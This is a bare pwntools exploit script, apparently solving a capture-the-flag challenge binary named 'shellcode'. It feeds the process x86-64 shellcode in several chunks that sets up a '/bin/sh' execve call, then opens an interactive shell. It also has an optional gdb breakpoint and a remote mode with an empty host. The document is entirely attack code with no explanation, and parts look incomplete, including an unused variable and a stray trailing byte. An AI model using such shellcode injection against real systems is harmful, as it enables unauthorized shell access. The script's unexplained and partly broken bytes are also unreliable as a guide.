#!/usr/bin/python3

from pwn import *

exe = ELF('shellcode', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+301

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
shellcode =          ""
sa(b"shellcode: \n", "\x48\xBF\x2F\x2F\x62\x69\x6E\x2F\x73\x68\xa0")
sa(b"shellcode: \n", "\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2")
sa(b"shellcode: \n", "\0")
sa(b"shellcode: \n", "\0")

p.interactive()
